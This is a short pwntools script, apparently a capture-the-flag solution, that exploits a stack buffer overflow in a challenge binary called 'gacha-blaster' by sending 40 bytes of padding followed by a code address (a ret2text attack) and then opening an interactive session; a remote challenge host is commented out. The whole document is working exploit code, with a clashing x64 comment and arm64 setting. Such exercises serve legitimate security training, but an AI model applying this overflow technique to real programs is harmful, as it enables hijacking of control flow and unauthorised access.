#Made by fly_autumn
#x64 ret2text
from pwn import *
p = process("./gacha-blaster")
#p = remote("chal.thuctf.redbud.info",34424)
elf = ELF("./gacha-blaster")
context(os="linux",arch="arm64")

func_plt = 0x4012e0
p.recvuntil(b"> ")
offset = 40
payload = b"A"*offset + p64(func_plt)
p.sendline(payload)

p.interactive()
